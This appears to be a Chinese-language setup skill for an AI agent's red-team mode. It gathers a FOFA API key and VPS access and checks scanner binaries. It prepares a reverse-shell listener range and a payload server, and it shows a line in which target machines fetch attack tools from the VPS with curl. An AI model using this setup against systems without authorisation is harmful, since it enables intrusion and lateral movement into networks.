---
id: redteam-redteam-setup
name: "redteam-setup"
description: "首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（二进制工具需自行放入 toolkit 目录）"
whenToUse: "用户第一次使用红队模式时；或 redteam_preflight 返回的 missing / toolkit.missing 非空时；或用户说\"环境没配好\"\"工具装一下\""
context: inline
version: "1.0"
---

# 首次使用引导（把环境一次配齐）

> **codelf 路径约定**：下文 `<CODELF_HOME>` = codelf 用户数据目录 —— Windows `%APPDATA%\.codelf`（PowerShell 里是 `$env:APPDATA\.codelf`）、macOS `~/Library/Application Support/.codelf`、Linux `~/.config/.codelf`。红队数据在其下的 `redteam\` 子目录。

**触发条件**（满足任一即执行本技能，不要跳过）：
- `redteam_preflight` 返回的 `missing` 非空（靶标未绑定、缺 FOFA_KEY 等）；
- `redteam_preflight` 返回的 `toolkit.missing` 非空（本机缺扫描器二进制）；
- 用户第一次进红队模式、或明确说"环境/工具没配好"。

**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。

## 一、这个集成带了什么、还缺什么

codelf **已内置全部 23 份红队技能**（侦察 / 漏洞发现 / 隧道 / 凭据 / WebShell / 反弹 Shell /
横向移动 / 未授权利用），不需要另外下载技能包，也没有"工具箱 tarball"或安装脚本。

缺的只是**二进制工具本身**（nmap / nuclei / fscan / gogo / suo5 / frpc 等）与
FOFA_KEY、VPS 这类外部资源：

- **二进制怎么放**：下载对应平台的版本，放进 `<CODELF_HOME>\redteam\toolkit\<工具>\`；
  已经装在 PATH 里也可以，`redteam_preflight` 的 `toolkit.found` 会认出来。
- **Windows 注意**：`fscan` / `gogo` / `suo5` / `frpc` 有 Windows 版（`*.exe`），
  但 `hydra` / `impacket` / `feroxbuster` 这类 Kali 自带件没有 Windows 版，相关技能会降级。
- **一个二进制都不装也能开工**：被动侦察（`passive-recon` / `fofa-recon`）、资产梳理、
  资产关联这些纯信息类技能不依赖任何二进制。

> **红线**：codelf 不替你下载或安装任何安全工具。需要什么，说清获取位置，由你自己取、自己执行。

## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）

| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
| --- | --- | --- | --- |
| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 系统环境变量 `FOFA_KEY`（codelf 不读 `.env`，见下方注意事项） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `<CODELF_HOME>/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |

**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。

**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
写进系统环境变量（Windows `setx FOFA_KEY 你的key`，改完重启 codelf）。

### FOFA_KEY 怎么拿（要能指导用户）
1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。

### VPS 怎么准备（要能指导用户）
- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
- 生成/放置 SSH 私钥到 `<CODELF_HOME>/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。

## 三、配置完的验证（必须做完才算引导成功）

逐项实测，**不要只看"文件存在"**：

```bash
# 1) FOFA key 有效
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS 可达（载荷服务是否在跑由 VPS 上自己确认）
ssh -i <CODELF_HOME>/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
```

3) **工具链与靶标绑定**：调 `redteam_preflight`，看它的返回：
   - `missing` 列出还缺的东西（靶标未绑定、FOFA_KEY 等）；
   - `toolkit.found` / `toolkit.missing` 列出本机找到 / 缺失的二进制；
   - `permissions` 说明写入类工具需要什么权限。
   `missing` 与 `toolkit.missing` 都清空（或只剩用户明确接受降级的项）才算配齐。

## 四、最后一步：复核并汇报

codelf 没有 `setup.sh`，也没有完成标记文件；判断"配好了"只看 `redteam_preflight` 的返回：

**再跑一次 `redteam_preflight`**，确认 `missing` 为空、`toolkit.missing` 为空或只剩用户接受降级的项。
把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。

**改完系统环境变量后必须重启 codelf**，否则当前进程读不到新的环境变量——
这一步要明确告诉用户（智能体不能替他重启）。

## 五、用户就是不给某些资源时（降级口径）

| 缺什么 | 降级方案 | 必须向用户说明的限制 |
| --- | --- | --- |
| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
| 系统工具（nuclei 等） | 同功能的其他扫描器，或手工验证 | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |

**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
